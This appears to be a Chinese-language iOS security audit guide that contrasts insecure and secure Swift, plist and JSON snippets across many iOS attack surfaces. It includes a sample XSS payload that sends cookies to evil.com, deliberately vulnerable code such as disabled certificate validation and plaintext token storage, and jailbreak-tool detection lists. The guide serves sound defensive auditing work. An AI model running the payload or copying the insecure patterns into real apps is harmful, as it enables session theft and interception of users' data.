# iOS SDK (UIKit/SwiftUI) Security Audit Guide

> iOS 应用安全审计模块
> 适用于: iOS 14+, UIKit, SwiftUI, Combine, WKWebView, App Extensions

## 核心危险面概述

iOS 应用安全审计核心攻击面：URL Scheme / Universal Links 入口验证、Keychain 配置与访问级别、App Transport Security (ATS) 策略、WKWebView JavaScript Bridge 安全、后台截屏与数据保护、Extension 沙箱隔离、Pasteboard 跨应用泄露、越狱检测与应用完整性、生物认证绕过、Info.plist 隐私权限滥用等。

---

## URL Scheme 安全

```swift
// ❌ 危险: 无验证直接处理 URL Scheme 参数
func application(_ app: UIApplication,
                 open url: URL,
                 options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
    let action = url.host           // attacker controlled
    let param = url.queryItems?["data"]  // attacker controlled
    performAction(action!, with: param!)  // ❌ Critical: 无验证直接执行
    return true
}

// ❌ 危险: URL Scheme 触发敏感操作 (转账、删除)
// myapp://transfer?to=attacker&amount=10000
func handleDeepLink(_ url: URL) {
    if url.host == "transfer" {
        let to = url.queryParam("to")!
        let amount = url.queryParam("amount")!
        transferMoney(to: to, amount: Double(amount)!)  // ❌ 无二次确认
    }
}

// ✓ 安全: 白名单验证 + 参数校验 + 来源检查
func application(_ app: UIApplication,
                 open url: URL,
                 options: [UIApplication.OpenURLOptionsKey: Any] = [:]) -> Bool {
    // 1. 检查来源应用
    let sourceApp = options[.sourceApplication] as? String ?? ""
    guard allowedSourceApps.contains(sourceApp) else {
        log.warning("Rejected URL from unknown source: \(sourceApp)")
        return false
    }

    // 2. 白名单验证 host
    guard let host = url.host, allowedActions.contains(host) else {
        return false
    }

    // 3. 安全解析参数
    guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false),
          let queryItems = components.queryItems else {
        return false
    }

    // 4. 对每个参数进行类型和范围验证
    let sanitizedParams = queryItems.reduce(into: [String: String]()) { result, item in
        if let value = item.value, allowedParamKeys.contains(item.name) {
            result[item.name] = value.sanitized()
        }
    }

    // 5. 敏感操作需要二次用户确认
    if sensitiveActions.contains(host) {
        presentConfirmation(action: host, params: sanitizedParams)
        return true
    }

    performAction(host, with: sanitizedParams)  // ✓
    return true
}

// SceneDelegate (iOS 13+)
// ❌ 危险: 同样需要在新 API 中验证
func scene(_ scene: UIScene,
           openURLContexts URLContexts: Set<UIOpenURLContext>) {
    guard let url = URLContexts.first?.url else { return }
    handleURL(url)  // ❌ 若 handleURL 无验证则同样危险
}
```

**威胁模型:**
- Custom URL scheme 可被其他应用注册劫持 (iOS 9 之前无所有权验证)
- URL scheme 参数注入 (SQL注入、XSS、路径遍历)
- 通过 URL scheme 触发敏感操作无二次确认
- 恶意应用通过 URL scheme 重定向实现钓鱼

---

## Universal Links / App Links

```swift
// ❌ 危险: 未验证 Universal Link 参数
func application(_ application: UIApplication,
                 continue userActivity: NSUserActivity,
                 restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
    guard let url = userActivity.webpageURL else { return false }
    let path = url.path  // attacker controlled via web redirect
    navigateTo(path)     // ❌ 未验证路径
    return true
}

// ✓ 安全: 完整验证
func application(_ application: UIApplication,
                 continue userActivity: NSUserActivity,
                 restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
    guard userActivity.activityType == NSUserActivityTypeBrowsingWeb,
          let url = userActivity.webpageURL,
          let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else {
        return false
    }

    // 1. 验证域名 (防止配置错误导致非预期域名的 Universal Link)
    guard let host = url.host,
          allowedDomains.contains(host) else {
        return false
    }

    // 2. 路径白名单验证
    let path = components.path
    guard allowedPathPrefixes.contains(where: { path.hasPrefix($0) }) else {
        return false
    }

    // 3. 参数验证
    let params = sanitizeQueryItems(components.queryItems)
    routeToContent(path: path, params: params)  // ✓
    return true
}
```

**apple-app-site-association (AASA) 审计:**
```json
// ❌ 危险: 通配符匹配所有路径
{
  "applinks": {
    "apps": [],
    "details": [{
      "appID": "TEAMID.com.example.app",
      "paths": ["*"]       // ❌ 匹配所有路径
    }]
  }
}

// ✓ 安全: 明确限定路径
{
  "applinks": {
    "apps": [],
    "details": [{
      "appID": "TEAMID.com.example.app",
      "paths": [
        "/product/*",      // ✓ 仅匹配特定路径
        "/user/profile/*",
        "NOT /admin/*"     // ✓ 排除敏感路径
      ]
    }]
  }
}
```

**审计要点:**
- AASA 文件必须通过 HTTPS 托管 (无重定向)
- Associated Domains Entitlement 配置审计
- Fallback 到 Safari 的安全影响 (用户数据通过浏览器暴露)
- 确保 AASA 路径不会覆盖管理后台等敏感路径

---

## App Transport Security (ATS)

```xml
<!-- ❌ Critical: 完全禁用 ATS -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <true/>    <!-- ❌ 允许所有 HTTP 明文连接 -->
</dict>

<!-- ❌ High: 为特定域禁用安全传输 -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSExceptionDomains</key>
    <dict>
        <key>api.example.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <true/>           <!-- ❌ 允许 HTTP -->
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.0</string>  <!-- ❌ TLS 1.0 已废弃 -->
        </dict>
    </dict>
</dict>

<!-- ❌ Medium: 允许任意 Web 内容 -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoadsInWebContent</key>
    <true/>    <!-- ❌ WKWebView 可加载 HTTP -->
</dict>

<!-- ✓ 安全: 严格 ATS 配置 -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>   <!-- ✓ 默认拒绝所有 HTTP -->
    <key>NSExceptionDomains</key>
    <dict>
        <key>legacy-api.example.com</key>
        <dict>
            <!-- ✓ 仅对确实需要的域名设置例外，并标注原因 -->
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <true/>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.2</string>  <!-- ✓ 至少 TLS 1.2 -->
        </dict>
    </dict>
</dict>
```

**ATS 审计检查清单:**
- `NSAllowsArbitraryLoads = true` 是 Critical 级别发现
- 审计每一个 `NSExceptionDomains` 条目是否有合理理由
- `NSExceptionMinimumTLSVersion` 低于 TLSv1.2 标记为 High
- `NSAllowsArbitraryLoadsInWebContent` 若非浏览器类应用不应为 true
- `NSAllowsLocalNetworking` 在生产环境中应为 false

---

## Keychain 安全

```swift
// ❌ 危险: 使用最低安全级别存储敏感数据
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "authToken",
    kSecValueData as String: tokenData,
    kSecAttrAccessible as String: kSecAttrAccessibleAlways  // ❌ Critical: 设备锁定时也可访问
]
SecItemAdd(query as CFDictionary, nil)

// ❌ 危险: 设备迁移后仍可用
let query: [String: Any] = [
    kSecAttrAccessible as String: kSecAttrAccessibleAlwaysThisDeviceOnly  // ❌ 仍在锁定时可访问
]

// ✓ 安全: 适当的访问级别 + 生物认证
let accessControl = SecAccessControlCreateWithFlags(
    kCFAllocatorDefault,
    kSecAttrAccessibleWhenUnlockedThisDeviceOnly,  // ✓ 仅解锁时 + 仅本设备
    [.biometryCurrentSet, .privateKeyUsage],        // ✓ 需要当前生物特征
    nil
)

let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrAccount as String: "authToken",
    kSecValueData as String: tokenData,
    kSecAttrAccessControl as String: accessControl!,
    kSecUseAuthenticationUI as String: kSecUseAuthenticationUIAllow
]
let status = SecItemAdd(query as CFDictionary, nil)
guard status == errSecSuccess else {
    // handle error properly
    return
}
```

**Keychain 访问级别安全矩阵:**
| 访问级别 | 锁定时可访问 | 迁移备份 | 安全评级 | 适用场景 |
|---------|:--------:|:------:|:------:|---------|
| `kSecAttrAccessibleAlways` | 是 | 是 | ❌ 危险 | 已废弃，不应使用 |
| `kSecAttrAccessibleAlwaysThisDeviceOnly` | 是 | 否 | ❌ 危险 | 已废弃 |
| `kSecAttrAccessibleAfterFirstUnlock` | 是* | 是 | 中等 | 后台刷新需访问的 token |
| `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` | 是* | 否 | 较安全 | 后台任务 token |
| `kSecAttrAccessibleWhenUnlocked` | 否 | 是 | ✓ 安全 | 一般凭据 |
| `kSecAttrAccessibleWhenUnlockedThisDeviceOnly` | 否 | 否 | ✓ 最安全 | 高敏感凭据 |
| `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` | 否 | 否 | ✓ 最安全 | 需要密码保护 |

**审计要点:**
- Keychain 数据在应用卸载后不会自动清除 (重装后可能残留旧 token)
- `keychain-access-groups` Entitlement 控制跨应用 Keychain 共享
- 无生物认证保护的 Keychain 项在越狱设备上可被提取

---

## WKWebView 安全

```swift
// ❌ 危险: 不安全的 JavaScript 注入
let userInput = getUntrustedInput()
webView.evaluateJavaScript("document.title = '\(userInput)'")  // ❌ XSS
// 攻击载荷: '; document.location='https://evil.com/?cookie='+document.cookie; '

// ❌ 危险: JS→Native Bridge 无验证
class ViewController: UIViewController, WKScriptMessageHandler {
    func setupWebView() {
        let config = WKWebViewConfiguration()
        config.userContentController.add(self, name: "nativeBridge")

        // ❌ 允许加载任意 URL 并暴露 native bridge
        let webView = WKWebView(frame: .zero, configuration: config)
        webView.load(URLRequest(url: URL(string: untrustedURL)!))  // ❌
    }

    func userContentController(_ userContentController: WKUserContentController,
                                didReceive message: WKScriptMessage) {
        if message.name == "nativeBridge" {
            let body = message.body as! [String: Any]
            let action = body["action"] as! String
            let data = body["data"] as! String
            executeNativeAction(action, data: data)  // ❌ 无验证执行 native 操作
        }
    }
}

// ❌ 危险: 允许 WebView 访问文件系统
let config = WKWebViewConfiguration()
config.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")  // ❌
webView.loadFileURL(fileURL, allowingReadAccessTo: documentsDirectory)   // ❌ 过宽的目录访问

// ✓ 安全: 完整的 WebView 安全配置
class SecureWebViewController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {

    private let allowedOrigins = ["https://app.example.com", "https://cdn.example.com"]

    func setupSecureWebView() {
        let config = WKWebViewConfiguration()

        // ✓ 限制 JavaScript
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true  // 仅在必要时启用

        // ✓ 注册有限的 message handler
        config.userContentController.add(self, name: "secureBridge")

        // ✓ 注入 CSP
        let csp = """
            var meta = document.createElement('meta');
            meta.httpEquiv = 'Content-Security-Policy';
            meta.content = "default-src 'self' https://app.example.com";
            document.head.appendChild(meta);
        """
        let script = WKUserScript(source: csp, injectionTime: .atDocumentStart, forMainFrameOnly: true)
        config.userContentController.addUserScript(script)

        let webView = WKWebView(frame: .zero, configuration: config)
        webView.navigationDelegate = self
    }

    // ✓ Navigation delegate 过滤 URL
    func webView(_ webView: WKWebView,
                 decidePolicyFor navigationAction: WKNavigationAction,
                 decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        guard let url = navigationAction.request.url,
              let scheme = url.scheme,
              ["https"].contains(scheme),               // ✓ 仅 HTTPS
              let host = url.host,
              allowedOrigins.contains("https://\(host)") else {  // ✓ 域名白名单
            decisionHandler(.cancel)
            return
        }
        decisionHandler(.allow)
    }

    // ✓ JS→Native Bridge 安全处理
    func userContentController(_ userContentController: WKUserContentController,
                                didReceive message: WKScriptMessage) {
        // ✓ 验证来源页面
        guard let url = message.webView?.url,
              allowedOrigins.contains(url.origin) else {
            return
        }

        // ✓ 验证消息格式和内容
        guard let body = message.body as? [String: Any],
              let action = body["action"] as? String,
              allowedBridgeActions.contains(action) else {
            return
        }

        // ✓ 参数化安全的 JavaScript 回调
        let sanitizedData = sanitize(body["data"])
        webView.evaluateJavaScript(
            "window.bridgeCallback(\(sanitizedData.jsonEncoded))"  // ✓ JSON 编码防注入
        )
    }
}
```

**WKWebView 审计要点:**
- `evaluateJavaScript` 中拼接用户输入 = XSS
- JS→Native bridge (`WKScriptMessageHandler`) 需验证消息来源和内容
- `allowFileAccessFromFileURLs` 私有 API 可能导致文件读取
- Cookie 隔离: 检查 `WKHTTPCookieStore` 是否泄露会话
- `loadFileURL(_:allowingReadAccessTo:)` 中访问目录范围应尽可能小

---

## 数据存储安全

```swift
// ❌ 危险: UserDefaults 存储敏感数据
UserDefaults.standard.set("Bearer eyJhbG...", forKey: "authToken")  // ❌ Critical: 明文存储 token
UserDefaults.standard.set("4111111111111111", forKey: "cardNumber") // ❌ Critical: 明文存储卡号
// UserDefaults 存储在 Library/Preferences/*.plist (明文 XML)

// ❌ 危险: 不安全的文件存储
let sensitiveData = "secret".data(using: .utf8)!
try sensitiveData.write(to: documentsURL.appendingPathComponent("secret.txt"))  // ❌ 无加密
// 默认 NSFileProtectionComplete，但...

// ❌ 危险: 降低文件保护级别
try FileManager.default.setAttributes(
    [.protectionKey: FileProtectionType.none],  // ❌ 无保护
    ofItemAtPath: filePath
)

// ❌ 危险: CoreData 无加密
let container = NSPersistentContainer(name: "Model")
container.loadPersistentStores { _, error in }  // ❌ SQLite 文件未加密

// ✓ 安全: 文件保护
try sensitiveData.write(
    to: secureFileURL,
    options: [.completeFileProtection]  // ✓ 设备锁定时文件加密
)

// ✓ 安全: 使用加密数据库 (SQLCipher)
let db = try Connection("path/to/db.sqlite3")
try db.key("strong-encryption-key")  // ✓ 密钥从 Keychain 获取

// ✓ 安全: CoreData with 加密 Transformer
class EncryptedTransformer: ValueTransformer {
    override func transformedValue(_ value: Any?) -> Any? {
        guard let data = value as? Data else { return nil }
        return try? AES.GCM.seal(data, using: encryptionKey).combined  // ✓
    }
}

// ✓ 安全: 排除敏感文件的 iCloud 备份
var resourceValues = URLResourceValues()
resourceValues.isExcludedFromBackup = true  // ✓
try secureFileURL.setResourceValues(resourceValues)
```

**文件保护级别矩阵:**
| 保护级别 | 锁定后可读 | 安全评级 | 适用场景 |
|---------|:--------:|:------:|---------|
| `FileProtectionType.none` | 是 | ❌ 危险 | 不应用于敏感数据 |
| `FileProtectionType.completeUnlessOpen` | 打开的文件可读 | 中等 | 后台下载文件 |
| `FileProtectionType.completeUntilFirstUserAuthentication` | 首次解锁后可读 | 较安全 | 后台任务数据 |
| `FileProtectionType.complete` | 否 | ✓ 安全 | 敏感数据 (默认) |

**数据存储审计要点:**
- UserDefaults 绝不用于存储 token、密码、密钥、PII
- iCloud/iTunes 备份可能泄露未加密数据
- Shared container (App Group) 中的数据可被同组 Extension 访问
- tmp/ 和 Caches/ 目录不加密
- Core Data SQLite 文件可在越狱设备上直接读取

---

## 后台安全 (Background Security)

```swift
// ❌ 危险: 进入后台时未隐藏敏感内容
// iOS 在进入后台时截取应用屏幕快照用于任务切换器
// 该快照可能包含敏感信息 (银行余额、个人信息、聊天记录)

// ✓ 安全: 后台截屏保护
class SceneDelegate: UIResponder, UIWindowSceneDelegate {
    private var privacyView: UIView?

    func sceneDidEnterBackground(_ scene: UIScene) {
        // ✓ 添加隐私遮罩
        let blurEffect = UIBlurEffect(style: .regular)
        let blurView = UIVisualEffectView(effect: blurEffect)
        blurView.frame = window?.bounds ?? .zero
        blurView.tag = 999
        window?.addSubview(blurView)
    }

    func sceneWillEnterForeground(_ scene: UIScene) {
        // ✓ 移除隐私遮罩
        window?.viewWithTag(999)?.removeFromSuperview()
    }
}

// SwiftUI 方式
// ✓ 安全: 环境监听后台状态
struct ContentView: View {
    @Environment(\.scenePhase) var scenePhase
    @State private var isBlurred = false

    var body: some View {
        SensitiveContentView()
            .blur(radius: isBlurred ? 20 : 0)  // ✓
            .onChange(of: scenePhase) { phase in
                isBlurred = (phase != .active)
            }
    }
}

// ❌ 危险: 推送通知泄露敏感内容
// 通知内容在锁屏上可见
{
    "aps": {
        "alert": {
            "title": "转账通知",
            "body": "您收到来自张三的转账 ¥50,000.00"  // ❌ 锁屏可见
        }
    }
}

// ✓ 安全: 使用 Notification Service Extension 处理敏感通知
// UNNotificationServiceExtension
class NotificationService: UNNotificationServiceExtension {
    override func didReceive(_ request: UNNotificationRequest,
                             withContentHandler contentHandler: @escaping (UNNotificationContent) -> Void) {
        let content = request.content.mutableCopy() as! UNMutableNotificationContent
        // ✓ 隐藏敏感信息
        content.body = "您有一条新的交易通知"
        contentHandler(content)
    }
}
```

**后台安全审计要点:**
- 任务切换器截屏保护 (`applicationDidEnterBackground`)
- Background URL Session 传输敏感数据的加密状态
- 推送通知内容在锁屏上的可见性
- 后台任务中内存数据的保护
- Background App Refresh 中的数据处理

---

## Extension 安全

```swift
// ❌ 危险: Share Extension 接受所有内容类型
// Info.plist
<key>NSExtensionActivationRule</key>
<string>TRUEPREDICATE</string>  // ❌ Critical: 接受所有内容

// ✓ 安全: 限定激活规则
<key>NSExtensionActivationRule</key>
<dict>
    <key>NSExtensionActivationSupportsWebURLWithMaxCount</key>
    <integer>1</integer>    <!-- ✓ 仅接受 1 个 URL -->
    <key>NSExtensionActivationSupportsImageWithMaxCount</key>
    <integer>0</integer>    <!-- ✓ 不接受图片 -->
    <key>NSExtensionActivationSupportsText</key>
    <false/>                <!-- ✓ 不接受文本 -->
</dict>

// ❌ 危险: Extension 与主应用共享容器中的敏感数据无保护
// 主应用写入:
let sharedDefaults = UserDefaults(suiteName: "group.com.example.app")
sharedDefaults?.set(authToken, forKey: "token")  // ❌ 明文 token 在共享容器

// ✓ 安全: 共享容器中的数据应加密
let sharedContainer = FileManager.default
    .containerURL(forSecurityApplicationGroupIdentifier: "group.com.example.app")!
let encryptedData = try AES.GCM.seal(sensitiveData, using: key).combined!
try encryptedData.write(to: sharedContainer.appendingPathComponent("secure.dat"))  // ✓

// ❌ 危险: Action Extension 返回修改后的数据无验证
class ActionViewController: UIViewController {
    func completeAction() {
        let output = NSExtensionItem()
        output.attachments = [modifiedContent]  // ❌ 确保不泄露额外数据
        extensionContext?.completeRequest(returningItems: [output])
    }
}
```

**Extension 审计要点:**
- `NSExtensionActivationRule` 为 `TRUEPREDICATE` 是 Critical 发现 (Apple 审核也会拒绝)
- App Group 共享容器中的数据保护级别
- Extension 沙箱边界: Extension 不能访问主应用容器 (除非通过 App Group)
- Keyboard Extension 的 `RequestsOpenAccess` 权限 (可进行网络请求)
- Today Widget / Widget Extension 中显示的敏感信息

---

## Pasteboard / 剪贴板安全

```swift
// ❌ 危险: 将敏感数据放入系统剪贴板
UIPasteboard.general.string = "4111-1111-1111-1111"  // ❌ 信用卡号
UIPasteboard.general.string = password                 // ❌ 密码
UIPasteboard.general.string = authToken                // ❌ Token
// 系统剪贴板可被任何应用读取 (iOS 14+ 会提示，但数据已泄露)

// ✓ 安全: 使用命名剪贴板 + 过期 + 本地限制
let securePasteboard = UIPasteboard(name: UIPasteboard.Name("com.example.secure"), create: true)
securePasteboard?.setItems(
    [[UTType.plainText.identifier: sensitiveText]],
    options: [
        .localOnly: true,              // ✓ 不通过 Universal Clipboard 同步到其他设备
        .expirationDate: Date().addingTimeInterval(60)  // ✓ 60秒后过期
    ]
)

// ✓ 安全: 敏感文本字段禁用复制
class SecureTextField: UITextField {
    override func canPerformAction(_ action: Selector, withSender sender: Any?) -> Bool {
        if action == #selector(copy(_:)) || action == #selector(cut(_:)) {
            return false  // ✓ 禁用复制/剪切
        }
        return super.canPerformAction(action, withSender: sender)
    }
}

// SwiftUI 方式
SecureField("Password", text: $password)  // ✓ SecureField 默认禁用复制

// ❌ 危险: 读取剪贴板时无类型检查
if let content = UIPasteboard.general.string {
    processInput(content)  // ❌ 不安全的剪贴板内容直接使用
}
```

**Pasteboard 审计要点:**
- `UIPasteboard.general` 中存放敏感数据是 High 级别发现
- Universal Clipboard 导致数据跨设备泄露 (iPhone -> Mac)
- iOS 14+ 显示剪贴板读取提示，但 iOS 13 及以下无提示
- `.localOnly` 和 `.expirationDate` (iOS 10+) 可限制风险
- 密码、Token、信用卡号应禁用复制操作

---

## 越狱检测与应用完整性

```swift
// ✓ 越狱检测 (多层检测)
class JailbreakDetector {

    static func isJailbroken() -> Bool {
        #if targetEnvironment(simulator)
        return false  // 模拟器不检测
        #else
        return checkSuspiciousFiles()
            || checkSuspiciousURLSchemes()
            || checkWriteOutsideSandbox()
            || checkDynamicLibraries()
            || checkForkAbility()
        #endif
    }

    // 检测 1: 可疑文件路径
    private static func checkSuspiciousFiles() -> Bool {
        let suspiciousPaths = [
            "/Applications/Cydia.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash",
            "/usr/sbin/sshd",
            "/etc/apt",
            "/usr/bin/ssh",
            "/private/var/lib/apt",
            "/private/var/lib/cydia",
            "/private/var/stash",
            "/usr/libexec/cydia",
            "/var/cache/apt",
            "/var/lib/cydia"
        ]
        return suspiciousPaths.contains { FileManager.default.fileExists(atPath: $0) }
    }

    // 检测 2: 可疑 URL Scheme
    private static func checkSuspiciousURLSchemes() -> Bool {
        let schemes = ["cydia://", "sileo://", "zbra://", "filza://", "undecimus://"]
        return schemes.contains { UIApplication.shared.canOpenURL(URL(string: $0)!) }
    }

    // 检测 3: 沙箱完整性 (能否写入沙箱外)
    private static func checkWriteOutsideSandbox() -> Bool {
        let testPath = "/private/jailbreaktest.txt"
        do {
            try "test".write(toFile: testPath, atomically: true, encoding: .utf8)
            try FileManager.default.removeItem(atPath: testPath)
            return true  // 能写入 = 越狱
        } catch {
            return false
        }
    }

    // 检测 4: 动态库注入检测
    private static func checkDynamicLibraries() -> Bool {
        let suspiciousLibs = ["SubstrateLoader", "SSLKillSwitch", "FridaGadget", "cycript", "libcycript"]
        let count = _dyld_image_count()
        for i in 0..<count {
            if let name = _dyld_get_image_name(i) {
                let libName = String(cString: name)
                if suspiciousLibs.contains(where: { libName.contains($0) }) {
                    return true
                }
            }
        }
        return false
    }

    // 检测 5: fork 能力
    private static func checkForkAbility() -> Bool {
        let pid = fork()
        if pid >= 0 {
            // fork 成功 = 越狱 (正常沙箱禁止 fork)
            if pid > 0 { kill(pid, SIGTERM) }
            return true
        }
        return false
    }
}
```

**App Attest / DeviceCheck (iOS 14+):**
```swift
// ✓ 使用 Apple App Attest 验证应用完整性
import DeviceCheck

class AppIntegrityChecker {
    let attestService = DCAppAttestService.shared

    func generateAttestation() async throws -> Data {
        guard attestService.isSupported else {
            throw IntegrityError.notSupported
        }

        // 1. 生成密钥
        let keyId = try await attestService.generateKey()

        // 2. 获取服务端 challenge
        let challenge = try await fetchChallenge()
        let challengeHash = Data(SHA256.hash(data: challenge))

        // 3. 生成 attestation
        let attestation = try await attestService.attestKey(keyId, clientDataHash: challengeHash)

        // 4. 发送 attestation 到服务端验证
        try await verifyOnServer(keyId: keyId, attestation: attestation, challenge: challenge)

        return attestation  // ✓
    }
}
```

**越狱检测审计要点:**
- 单一检测方法易被绕过 (如 Liberty Lite、Shadow)
- 越狱检测应在多处调用，而非仅启动时
- 检测结果不应存储在 UserDefaults (可被修改)
- 服务端应参与完整性验证 (不能仅依赖客户端)
- App Attest 是 Apple 推荐的完整性验证方案

---

## 生物认证安全

```swift
// ❌ 危险: 仅依赖本地生物认证结果
let context = LAContext()
var error: NSError?
if context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) {
    context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
                           localizedReason: "验证身份") { success, error in
        if success {
            self.grantAccess()  // ❌ 仅依赖本地布尔值，可被 hook 绕过
        }
    }
}

// ❌ 危险: 允许回退到 Passcode
context.evaluatePolicy(.deviceOwnerAuthentication,  // ❌ 包含 passcode fallback
                       localizedReason: "验证身份") { success, _ in }

// ❌ 危险: 不检查生物特征变更
// 用户添加新指纹后仍通过认证，可能被强制添加指纹

// ✓ 安全: 生物认证 + Keychain 绑定
func authenticateWithBiometric() {
    let context = LAContext()
    context.touchIDAuthenticationAllowableReuseDuration = 0  // ✓ 每次都验证

    // ✓ 检查生物特征是否变更
    if let previousDomainState = loadPreviousBiometricState(),
       context.evaluatedPolicyDomainState != previousDomainState {
        // 生物特征已变更 (新指纹/Face ID)，要求重新验证密码
        requirePasswordReauth()
        return
    }

    // ✓ 使用 Keychain 绑定生物认证 (而非仅布尔值)
    let query: [String: Any] = [
        kSecClass as String: kSecClassGenericPassword,
        kSecAttrAccount as String: "biometric-protected-secret",
        kSecMatchLimit as String: kSecMatchLimitOne,
        kSecReturnData as String: true,
        kSecUseOperationPrompt as String: "验证身份以访问",
        kSecUseAuthenticationContext as String: context
    ]

    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    if status == errSecSuccess, let data = result as? Data {
        // ✓ 只有通过生物认证才能取出 Keychain 中的 secret
        let secret = String(data: data, encoding: .utf8)
        proceedWithSecret(secret!)
    }
}
```

**生物认证审计要点:**
- 仅依赖 `evaluatePolicy` 返回的布尔值不安全 (可被 Frida hook)
- 应将敏感数据存入 Keychain 并绑定 `SecAccessControl` 的 `.biometryCurrentSet`
- `evaluatedPolicyDomainState` 变化表示生物特征被修改
- `.deviceOwnerAuthentication` 允许 Passcode 回退，降低安全性
- `touchIDAuthenticationAllowableReuseDuration` 应为 0 或极短

---

## Info.plist 审计检查清单

| 配置项 | 危险值 | 安全值 | 影响 |
|-------|-------|-------|------|
| `NSAllowsArbitraryLoads` | `true` | `false` | ❌ Critical: 允许所有 HTTP |
| `NSExceptionAllowsInsecureHTTPLoads` | `true` (无合理域名) | `false` | ❌ High: 特定域 HTTP |
| `NSExceptionMinimumTLSVersion` | `TLSv1.0` / `TLSv1.1` | `TLSv1.2`+ | ❌ High: 弱 TLS |
| `NSAllowsArbitraryLoadsInWebContent` | `true` (非浏览器) | `false` | ❌ Medium: WebView HTTP |
| `NSAllowsLocalNetworking` | `true` (生产环境) | `false` | ❌ Medium: 本地网络 |
| `CFBundleURLSchemes` | 通用 scheme 名 | 唯一反向域名前缀 | ❌ Medium: scheme 劫持 |
| `UIBackgroundModes` | 不必要的模式 | 仅必要模式 | ❌ Low: 后台权限 |
| `NSExtensionActivationRule` | `TRUEPREDICATE` | 具体规则 dict | ❌ Critical: 全接受 |
| `NSCameraUsageDescription` | 存在但无使用 | 仅在使用相机时存在 | ❌ Low: 多余权限 |
| `NSLocationAlwaysUsageDescription` | 不需要持续定位时存在 | 使用 WhenInUse | ❌ Medium: 过度定位 |
| `NSPhotoLibraryUsageDescription` | 存在但仅需有限访问 | 使用 PHPickerViewController | ❌ Low: 过度权限 |
| `ITSAppUsesNonExemptEncryption` | 缺失 | `true`/`false` 明确声明 | 合规风险 |
| `UIRequiredDeviceCapabilities` | 缺少安全硬件要求 | 根据需要包含 | 安全基线 |

**Entitlement 审计:**
| Entitlement | 风险 | 审计要点 |
|------------|------|---------|
| `com.apple.developer.associated-domains` | Medium | Universal Links 域名范围 |
| `keychain-access-groups` | High | Keychain 跨应用共享范围 |
| `com.apple.security.application-groups` | Medium | App Group 数据共享 |
| `aps-environment` | Low | 推送通知环境 (production vs development) |
| `com.apple.developer.devicecheck.appattest-environment` | Info | App Attest 环境 |

---

## 网络安全

```swift
// ❌ 危险: 禁用 SSL 证书验证
class InsecureDelegate: NSObject, URLSessionDelegate {
    func urlSession(_ session: URLSession,
                    didReceive challenge: URLAuthenticationChallenge,
                    completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        // ❌ Critical: 接受所有证书 (中间人攻击)
        completionHandler(.useCredential,
                          URLCredential(trust: challenge.protectionSpace.serverTrust!))
    }
}

// ❌ 危险: 第三方库禁用证书验证
// Alamofire
let manager = Session(
    serverTrustManager: ServerTrustManager(
        evaluators: ["api.example.com": DisabledTrustEvaluator()]  // ❌
    )
)

// ✓ 安全: SSL Pinning
class PinnedSessionDelegate: NSObject, URLSessionDelegate {
    let pinnedCertificates: [Data]  // 预置的证书或公钥哈希

    func urlSession(_ session: URLSession,
                    didReceive challenge: URLAuthenticationChallenge,
                    completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        guard challenge.protectionSpace.authenticationMethod == NSURLAuthenticationMethodServerTrust,
              let serverTrust = challenge.protectionSpace.serverTrust else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }

        // ✓ 标准证书验证
        var error: CFError?
        guard SecTrustEvaluateWithError(serverTrust, &error) else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }

        // ✓ Certificate Pinning
        guard let serverCert = SecTrustGetCertificateAtIndex(serverTrust, 0) else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }
        let serverCertData = SecCertificateCopyData(serverCert) as Data
        guard pinnedCertificates.contains(serverCertData) else {
            completionHandler(.cancelAuthenticationChallenge, nil)  // ✓ 证书不匹配则拒绝
            return
        }

        completionHandler(.useCredential, URLCredential(trust: serverTrust))
    }
}
```

**网络安全审计要点:**
- 搜索 `URLSession.AuthChallengeDisposition` / `.useCredential` 无验证场景
- `DisabledTrustEvaluator` (Alamofire) 表示禁用证书验证
- 生产环境应实施 SSL Pinning (证书或公钥)
- 检查是否有调试用的代理信任代码残留

---

## 审计正则速查

```regex
# URL Scheme - 无验证的 URL 处理
open\s+url:\s*URL|openURLContexts|handleOpenURL|application.*open\s+url

# Universal Links
continue\s+userActivity|NSUserActivityTypeBrowsingWeb|webpageURL

# ATS 配置
NSAllowsArbitraryLoads|NSExceptionAllowsInsecureHTTPLoads|NSAllowsArbitraryLoadsInWebContent

# Keychain 不安全访问级别
kSecAttrAccessibleAlways|kSecAttrAccessibleAlwaysThisDeviceOnly

# Keychain 操作
SecItemAdd|SecItemUpdate|SecItemCopyMatching|SecItemDelete|kSecClass

# WKWebView JavaScript
evaluateJavaScript|WKScriptMessageHandler|WKUserScript|addUserScript
javaScriptEnabled|allowFileAccessFromFileURLs

# 数据存储 - UserDefaults 敏感数据
